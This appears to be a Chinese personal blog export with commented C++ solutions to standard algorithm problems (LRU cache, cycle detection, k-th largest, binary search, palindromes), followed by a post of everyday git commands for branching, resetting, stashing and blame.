<h1 id="34、检查链表是否有环路（空间复杂度O-1-）"><a href="#34、检查链表是否有环路（空间复杂度O-1-）" class="headerlink" title="34、检查链表是否有环路（空间复杂度O(1)）"></a>34、检查链表是否有环路（空间复杂度O(1)）</h1><h2 id="题目-31"><a href="#题目-31" class="headerlink" title="题目"></a>题目</h2><p>判断给定的链表中是否有环。如果有环则返回true，否则返回false。<br>你能给出空间复杂度O(1)的解法么？</p>
<h2 id="思路-33"><a href="#思路-33" class="headerlink" title="思路"></a>思路</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">hasCycle</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">		<span class="comment">/* 思路1</span></span><br><span class="line"><span class="comment">         * 想象两个人在捉迷藏，一个人先走到一个地方，另一个人去找</span></span><br><span class="line"><span class="comment">         * 如果找到他的时候和他走的路程一样长，那就是原路找的</span></span><br><span class="line"><span class="comment">         * 如果比他路程还短，说明另外一个人绕了一圈，也就是有环路</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * 思路2（当前实现代码）</span></span><br><span class="line"><span class="comment">         * 两个人追逐，一个走的快（一次2步），一个走的慢（一次一步）</span></span><br><span class="line"><span class="comment">         * 如果相遇，说明有环路</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * 思路3</span></span><br><span class="line"><span class="comment">         * 破坏链表，遍历的同时，让前一个节点指向头指针</span></span><br><span class="line"><span class="comment">         * 遍历如果到了头指针就说明有环路</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">        ListNode *pFast = head;     <span class="comment">// 跑的快的指针</span></span><br><span class="line">        ListNode *pSlow = head;     <span class="comment">// 跑得慢的指针</span></span><br><span class="line">        <span class="keyword">while</span> (pFast != <span class="literal">nullptr</span> &amp;&amp; pFast-&gt;next != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            pSlow = pSlow-&gt;next;</span><br><span class="line">            pFast = pFast-&gt;next-&gt;next;</span><br><span class="line">            <span class="keyword">if</span> (pSlow == pFast) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="35-设计实现LRU缓存结构"><a href="#35-设计实现LRU缓存结构" class="headerlink" title="35. 设计实现LRU缓存结构"></a>35. 设计实现LRU缓存结构</h1><h2 id="题目-32"><a href="#题目-32" class="headerlink" title="题目"></a>题目</h2><p>设计LRU缓存结构，该结构在构造时确定大小，假设大小为K，并有如下两个功能</p>
<ol>
<li>set(key, value)：将记录(key, value)插入该结构</li>
<li>get(key)：返回key对应的value值</li>
</ol>
<p>[要求]</p>
<ol>
<li>set和get方法的时间复杂度为O(1)</li>
<li>某个key的set或get操作一旦发生，认为这个key的记录成了最常使用的。</li>
<li>当缓存的大小超过K时，移除最不经常使用的记录，即set或get最久远的。</li>
</ol>
<h2 id="思路-34"><a href="#思路-34" class="headerlink" title="思路"></a>思路</h2><ul>
<li>查找使用hashmap，时间复杂度O(1)满足</li>
<li>lru管理用链表，方便调整位置</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">lru_cache</span> &#123;</span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">lru_cache</span>(<span class="type">int</span> k) : <span class="built_in">cache_size</span>(k) &#123;</span><br><span class="line">        m_lruList.<span class="built_in">clear</span>();</span><br><span class="line">        m_cache.<span class="built_in">clear</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">set</span><span class="params">(<span class="type">int</span> key, <span class="type">int</span> value)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 先查找value</span></span><br><span class="line">        <span class="keyword">auto</span> it = m_cache.<span class="built_in">find</span>(key);</span><br><span class="line">        <span class="keyword">if</span> (it != m_cache.<span class="built_in">end</span>()) &#123;</span><br><span class="line">            <span class="comment">// 找到修改值</span></span><br><span class="line">            (*it-&gt;second).second = value;</span><br><span class="line">            <span class="comment">// 找到，将缓存插入到最前面</span></span><br><span class="line">            m_lruList.<span class="built_in">splice</span>(m_lruList.<span class="built_in">begin</span>(), m_lruList, it-&gt;second);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 没找到，插入</span></span><br><span class="line">        <span class="comment">// 判断是否超过最大个数，删除最后一个，map也要删除</span></span><br><span class="line">        <span class="keyword">if</span> (m_lruList.<span class="built_in">size</span>() &gt;= cache_size) &#123;</span><br><span class="line">            <span class="keyword">auto</span> delIt = m_lruList.<span class="built_in">back</span>();</span><br><span class="line">            m_cache.<span class="built_in">erase</span>(delIt.first);</span><br><span class="line">            m_lruList.<span class="built_in">pop_back</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        m_lruList.<span class="built_in">emplace_front</span>(<span class="built_in">make_pair</span>(key, value));</span><br><span class="line">        m_cache[key] = m_lruList.<span class="built_in">begin</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">get</span><span class="params">(<span class="type">int</span> key)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 先查找value</span></span><br><span class="line">        <span class="keyword">auto</span> it = m_cache.<span class="built_in">find</span>(key);</span><br><span class="line">        <span class="keyword">if</span> (it == m_cache.<span class="built_in">end</span>()) &#123;</span><br><span class="line">            <span class="comment">// 没找到返回-1</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 找到，将缓存插入到最前面</span></span><br><span class="line">        m_lruList.<span class="built_in">splice</span>(m_lruList.<span class="built_in">begin</span>(), m_lruList, it-&gt;second);</span><br><span class="line">        <span class="comment">// 这里返回值</span></span><br><span class="line">        <span class="keyword">return</span> (*it-&gt;second).second;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> cache_size;                  <span class="comment">// cache最大大小</span></span><br><span class="line">    list&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; m_lruList;  <span class="comment">// 用于存放lru的链表，值为value</span></span><br><span class="line">    unordered_map&lt;<span class="type">int</span>, list&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt;::iterator&gt;</span><br><span class="line">        m_cache;  <span class="comment">// 用于O(1)查找的map</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="36-二叉树之字型遍历"><a href="#36-二叉树之字型遍历" class="headerlink" title="36. 二叉树之字型遍历"></a>36. 二叉树之字型遍历</h1><h2 id="题目-33"><a href="#题目-33" class="headerlink" title="题目"></a>题目</h2><p>给定一个二叉树，返回该二叉树的之字形层序遍历，（第一层从左向右，下一层从右向左，一直这样交替）</p>
<h2 id="思路-35"><a href="#思路-35" class="headerlink" title="思路"></a>思路</h2><ul>
<li>肯定要用栈的，不然做不到先入后出</li>
</ul>
<p><strong>思路1</strong></p>
<ul>
<li>两个栈，一进一出</li>
</ul>
<p><strong>思路2</strong></p>
<ul>
<li>一个栈一个队列</li>
<li>每一层，出栈进队列</li>
<li>再出队列</li>
</ul>
<p><strong>思路3</strong></p>
<ul>
<li>一个链表搞定（模拟两个栈，栈底对在一起）</li>
<li>左出右进，右出左进</li>
</ul>
<h1 id="37-股票（一次交易）"><a href="#37-股票（一次交易）" class="headerlink" title="37. 股票（一次交易）"></a>37. 股票（一次交易）</h1><h2 id="题目-34"><a href="#题目-34" class="headerlink" title="题目"></a>题目</h2><p>假设你有一个数组，其中第 i 个元素是股票在第 i 天的价格。<br>你有一次买入和卖出的机会。（只有买入了股票以后才能卖出）。请你设计一个算法来计算可以获得的最大收益。</p>
<h2 id="思路-36"><a href="#思路-36" class="headerlink" title="思路"></a>思路</h2><p><strong>动态规划</strong></p>
<ul>
<li>f(n)为n天卖出的收益，max(f(n)) &#x3D; prices[n] - min(prices[n])</li>
<li>遍历数组，找到f(n)最大值</li>
</ul>
<h1 id="38-找出第k大"><a href="#38-找出第k大" class="headerlink" title="38. 找出第k大"></a>38. 找出第k大</h1><h2 id="题目-35"><a href="#题目-35" class="headerlink" title="题目"></a>题目</h2><p>有一个整数数组，请你根据快速排序的思路，找出数组中第K大的数。<br>给定一个整数数组a,同时给定它的大小n和要找的K(K在1到n之间)，请返回第K大的数，保证答案存在。</p>
<h2 id="思路-37"><a href="#思路-37" class="headerlink" title="思路"></a>思路</h2><ul>
<li>快排，找节点，插入</li>
<li>节点左右，k在哪里，对哪里做快排</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @brief 转递归函数实现，a传入指针方便递归</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @param a 头指针</span></span><br><span class="line"><span class="comment">     * @param n 数组长度</span></span><br><span class="line"><span class="comment">     * @param K K值</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @return 返回第K大的值</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findKth</span><span class="params">(<span class="type">int</span> *a, <span class="type">int</span> n, <span class="type">int</span> K)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">assert</span>(K &gt; <span class="number">0</span> &amp;&amp; n &gt; <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">assert</span>(n &gt;= K);</span><br><span class="line">        <span class="comment">// use the first item to be the axis</span></span><br><span class="line">        <span class="type">int</span> axis = a[<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span> left = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> right = n - <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// First, the right run, when right &gt; axis, left = right, then left run</span></span><br><span class="line">        <span class="comment">// when left &lt; axis, right = left, then right run</span></span><br><span class="line">        <span class="comment">// equal won&#x27;t handle</span></span><br><span class="line">        <span class="comment">// with this way, we can avoid swap item too frequently</span></span><br><span class="line">        <span class="type">bool</span> isRightRun = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">while</span> (left != right) &#123;</span><br><span class="line">            <span class="comment">// right run</span></span><br><span class="line">            <span class="keyword">if</span> (isRightRun) &#123;</span><br><span class="line">                <span class="comment">// right less than axis</span></span><br><span class="line">                <span class="keyword">if</span> (a[right] &lt;= axis) &#123;</span><br><span class="line">                    right--;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                a[left] = a[right];</span><br><span class="line">                isRightRun = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// left run</span></span><br><span class="line">            <span class="comment">// left bigger than axis</span></span><br><span class="line">            <span class="keyword">if</span> (a[left] &gt;= axis) &#123;</span><br><span class="line">                left++;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            a[right] = a[left];</span><br><span class="line">            isRightRun = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        a[left] = axis;</span><br><span class="line">        <span class="comment">// if left is K</span></span><br><span class="line">        <span class="keyword">if</span> ((left + <span class="number">1</span>) == K) <span class="keyword">return</span> axis;</span><br><span class="line">        <span class="comment">// left bigger than K, use right part to sort</span></span><br><span class="line">        <span class="keyword">if</span> ((left + <span class="number">1</span>) &lt; K) <span class="keyword">return</span> <span class="built_in">findKth</span>(a + left + <span class="number">1</span>, n - <span class="number">1</span> - left, K - left - <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// left bigger than K, use right part to sort</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">findKth</span>(a, left, K);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findKth</span><span class="params">(vector&lt;<span class="type">int</span>&gt; a, <span class="type">int</span> n, <span class="type">int</span> K)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        <span class="comment">/* 思路1</span></span><br><span class="line"><span class="comment">         * 小根堆实现</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * 思路2（当前）</span></span><br><span class="line"><span class="comment">         * 快排思想</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">findKth</span>(&amp;a[<span class="number">0</span>], n, K);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="39-二分查找"><a href="#39-二分查找" class="headerlink" title="39. 二分查找"></a>39. 二分查找</h1><h2 id="问题-2"><a href="#问题-2" class="headerlink" title="问题"></a>问题</h2><p>请实现有重复数字的升序数组的二分查找<br>给定一个 元素有序的（升序）整型数组 nums 和一个目标值 target  ，写一个函数搜索 nums 中的 target，如果目标值存在返回下标，否则返回 -1</p>
<h2 id="思路-38"><a href="#思路-38" class="headerlink" title="思路"></a>思路</h2><ul>
<li>思路就是二分查找思路</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 如果目标值存在返回下标，否则返回 -1</span></span><br><span class="line"><span class="comment">     * @param nums int整型vector</span></span><br><span class="line"><span class="comment">     * @param target int整型</span></span><br><span class="line"><span class="comment">     * @return int整型</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">search</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        <span class="type">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> left = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> right = len - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// check array boundary</span></span><br><span class="line">        <span class="keyword">if</span> (len == <span class="number">0</span> || target &lt; nums.<span class="built_in">front</span>() || target &gt; nums[right])</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span> (target == nums.<span class="built_in">front</span>()) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// left move faster than mid and mid is more close to left, finally left</span></span><br><span class="line">        <span class="comment">// will be equal or bigger than right</span></span><br><span class="line">        <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">            <span class="type">int</span> mid = (right + left) &gt;&gt; <span class="number">1</span>;  <span class="comment">// 0-3 mid 1, more close to left</span></span><br><span class="line">            <span class="comment">// fast convergence, mid +- 1</span></span><br><span class="line">            <span class="keyword">if</span> (target &gt; nums[mid])</span><br><span class="line">                left = mid + <span class="number">1</span>;  <span class="comment">// left - 1 must less than target</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                right = mid - <span class="number">1</span>;  <span class="comment">// right + 1 maybe equal target</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// if left bigger than right, judge left only</span></span><br><span class="line">        <span class="comment">// if left == right, judge left and right + 1</span></span><br><span class="line">        <span class="keyword">if</span> (nums[left] == target) <span class="keyword">return</span> left;</span><br><span class="line">        <span class="keyword">if</span> (left == right &amp;&amp; nums[++left] == target) <span class="keyword">return</span> left;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="40-最长无重复子串"><a href="#40-最长无重复子串" class="headerlink" title="40. 最长无重复子串"></a>40. 最长无重复子串</h1><h2 id="题目-36"><a href="#题目-36" class="headerlink" title="题目"></a>题目</h2><p>给定一个数组arr，返回arr的最长无的重复子串的长度(无重复指的是所有数字都不相同)。</p>
<h2 id="思路-39"><a href="#思路-39" class="headerlink" title="思路"></a>思路</h2><ul>
<li>动态规划思想，查找最快是hashmap</li>
<li>用hashmap维持无重复子串的队列，</li>
<li>遍历数组，一个一个插入hashmap，遇到重复的，当前hashmap大小就是z无重复子串大小</li>
<li>将上一个重复的点包括之前的全部删掉（hashmap删除重建更好写，或许更快）</li>
<li>数组遍历一遍即可</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @param arr int整型vector the array</span></span><br><span class="line"><span class="comment">     * @return int整型</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxLength</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; arr)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; um_map;</span><br><span class="line">        <span class="type">int</span> len = arr.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="comment">// if value in map, map size may be the result, then i = last common value + 1</span></span><br><span class="line">            <span class="keyword">auto</span> it = um_map.<span class="built_in">find</span>(arr[i]);</span><br><span class="line">            <span class="keyword">if</span> (it != um_map.<span class="built_in">end</span>()) &#123;</span><br><span class="line">                <span class="type">int</span> mapLen = um_map.<span class="built_in">size</span>();</span><br><span class="line">                result = result &gt; mapLen ? result : mapLen;</span><br><span class="line">                i = it-&gt;second + <span class="number">1</span>;</span><br><span class="line">                um_map.<span class="built_in">clear</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            um_map[arr[i]] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> mapLen = um_map.<span class="built_in">size</span>();</span><br><span class="line">        result = result &gt; mapLen ? result : mapLen;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="41-最长回文长度"><a href="#41-最长回文长度" class="headerlink" title="41. 最长回文长度"></a>41. 最长回文长度</h1><h2 id="题目-37"><a href="#题目-37" class="headerlink" title="题目"></a>题目</h2><p>对于一个字符串，请设计一个高效算法，计算其中最长回文子串的长度。<br>给定字符串A以及它的长度n，请返回最长回文子串的长度。</p>
<h2 id="思路-40"><a href="#思路-40" class="headerlink" title="思路"></a>思路</h2><ul>
<li>遍历数组，每一个点和点后面的间隔为中心，分别找到重复最大值</li>
<li>遍历完成得到结果</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getLongestPalindrome</span><span class="params">(string A, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="comment">// think every char as mid, caculate the same len</span></span><br><span class="line">            <span class="comment">// 1234321</span></span><br><span class="line">            <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt; (i + <span class="number">1</span>) &amp;&amp; j &lt; (n - i); ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (A[i + j] != A[i - j]) &#123;</span><br><span class="line">                    <span class="type">int</span> len = (j - <span class="number">1</span>) * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">                    result = result &gt; len ? result : len;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (j == (i + <span class="number">1</span>) || j == (n - i)) &#123;</span><br><span class="line">                <span class="type">int</span> len = (j - <span class="number">1</span>) * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">                result = result &gt; len ? result : len;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// think every char as left first, caculate the same len</span></span><br><span class="line">            <span class="comment">// 123321</span></span><br><span class="line">            <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; (i + <span class="number">1</span>) &amp;&amp; j &lt; (n - i - <span class="number">1</span>); ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (A[i + j + <span class="number">1</span>] != A[i - j]) &#123;</span><br><span class="line">                    <span class="type">int</span> len = j * <span class="number">2</span>;</span><br><span class="line">                    result = result &gt; len ? result : len;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (j == (i + <span class="number">1</span>) || j == (n - i - <span class="number">1</span>)) &#123;</span><br><span class="line">                <span class="type">int</span> len = j * <span class="number">2</span>;</span><br><span class="line">                result = result &gt; len ? result : len;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Study</category>
      </categories>
  </entry>
  <entry>
    <title>git命令学习</title>
    <url>/blogs/2018-08-20-gitStudy/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="1-下载安装包慢"><a href="#1-下载安装包慢" class="headerlink" title="1. 下载安装包慢"></a>1. 下载安装包慢</h2><ul>
<li>可以从阿里镜像下载 <a href="https://npm.taobao.org/mirrors/git-for-windows/">https://npm.taobao.org/mirrors/git-for-windows/</a></li>
</ul>
<h1 id="一、分支使用"><a href="#一、分支使用" class="headerlink" title="一、分支使用"></a>一、分支使用</h1><h2 id="1-基本操作"><a href="#1-基本操作" class="headerlink" title="1. 基本操作"></a>1. 基本操作</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看本地和远程所有分支</span></span><br><span class="line">git branch -a</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1. 本地创建并切换分支</span></span><br><span class="line">git checkout -b &#x27;branch&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">2. 将远程分支check到本地同名分支并跟踪</span></span><br><span class="line">git checkout -b &#x27;branch&#x27; --track &#x27;origin/branch&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">3. 将本地分支推送到远程另一个分支上</span></span><br><span class="line">git push (origin_name) &#x27;branch&#x27;:&#x27;branch&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">4. 将本地分支推送到远程不存在的分支上（新建远程分支）</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">不跟踪</span></span><br><span class="line">git push (origin_name) (branch_name)</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加跟踪</span></span><br><span class="line">git push --set-upstream (origin_name) (branch_name)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">5. 强制使用远程分支内容</span></span><br><span class="line">git reset --hard (origin_name)/(branch)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">6. 强制更新远端仓库</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">全部更新</span></span><br><span class="line">git push -f (origin_name)</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">只更新一个分支</span></span><br><span class="line">git push -f (origin_name) (branch)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">7. 删除分支</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除本地分支</span></span><br><span class="line">git branch -d (branch)      # 删除本地和远端已同步的分支</span><br><span class="line">git branch -D (branch)      # 强制删除本地分支不关心是否同步</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除远程分支</span></span><br><span class="line">git push (origin_name) --delete (branch)    # 删除远程origin_name的branch分支</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">8. 只拉去远端一个分支的代码，节省空间</span></span><br><span class="line">git clone -b xxx --depth 1 https://github.com/xxx/xxxxxxx.git</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">新拉取一个分支</span></span><br><span class="line">git remote set-branches origin &#x27;remote_branch_name&#x27;</span><br><span class="line">git fetch --depth 1 origin remote_branch_name</span><br><span class="line">git checkout remote_branch_name</span><br></pre></td></tr></table></figure>

<h1 id="二、代码回退"><a href="#二、代码回退" class="headerlink" title="二、代码回退"></a>二、代码回退</h1><h2 id="未保存暂存区"><a href="#未保存暂存区" class="headerlink" title="未保存暂存区"></a>未保存暂存区</h2><p>撤销一个文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git checkout -- (test.py)</span><br></pre></td></tr></table></figure>

<h2 id="保存到暂存区"><a href="#保存到暂存区" class="headerlink" title="保存到暂存区"></a>保存到暂存区</h2><p>撤销一个文件的暂存区保存操作（未撤销文件改动）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git checkout HEAD (test.py)  # 回到提交点，保留本地改动</span><br><span class="line">git checkout --hard HEAD     # 强制回到提交点，丢弃所有改动</span><br></pre></td></tr></table></figure>

<h2 id="单个文件回退到一个版本"><a href="#单个文件回退到一个版本" class="headerlink" title="单个文件回退到一个版本"></a>单个文件回退到一个版本</h2><ul>
<li>将commitid对应的改动放到暂存区，文件当前样子为当前modify</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git reset (commitid) (filePath)</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用远端的，以暂存区为准</span></span><br><span class="line">git checkout -- (filePath)</span><br></pre></td></tr></table></figure>

<h1 id="三、储藏区"><a href="#三、储藏区" class="headerlink" title="三、储藏区"></a>三、储藏区</h1><p>只会保存修改的文件，添加删除不会保存</p>
<h2 id="1-保存当前代码到储藏区"><a href="#1-保存当前代码到储藏区" class="headerlink" title="1. 保存当前代码到储藏区"></a>1. 保存当前代码到储藏区</h2><p>想切换分支但没有完成需要提交一次的代码，临时存到储藏区</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git stash</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">只stash暂存区的文件</span></span><br><span class="line">git stash -S</span><br></pre></td></tr></table></figure>

<h2 id="2-查看储藏区内容"><a href="#2-查看储藏区内容" class="headerlink" title="2. 查看储藏区内容"></a>2. 查看储藏区内容</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看有几条stash</span></span><br><span class="line">git stash list</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看最近一次stash的内容</span></span><br><span class="line">git stash show</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">按序号查看stash的内容</span></span><br><span class="line">git stash show 1</span><br></pre></td></tr></table></figure>

<h2 id="3-恢复储藏区内容"><a href="#3-恢复储藏区内容" class="headerlink" title="3. 恢复储藏区内容"></a>3. 恢复储藏区内容</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git stash pop</span><br></pre></td></tr></table></figure>

<h2 id="4-删除某一个储藏区内容"><a href="#4-删除某一个储藏区内容" class="headerlink" title="4. 删除某一个储藏区内容"></a>4. 删除某一个储藏区内容</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git stash drop 1</span><br></pre></td></tr></table></figure>

<h1 id="四、查看改动记录"><a href="#四、查看改动记录" class="headerlink" title="四、查看改动记录"></a>四、查看改动记录</h1><h2 id="查看某一个文件内容的改动人和时间"><a href="#查看某一个文件内容的改动人和时间" class="headerlink" title="查看某一个文件内容的改动人和时间"></a>查看某一个文件内容的改动人和时间</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git blame (fileName)</span><br><span class="line">git blame -L n,m (fileName)</span><br></pre></td></tr></table></figure>

<ul>
<li><code>-L</code>参数为查看n到m行的改动记录，不加为文件所有改动</li>
</ul>
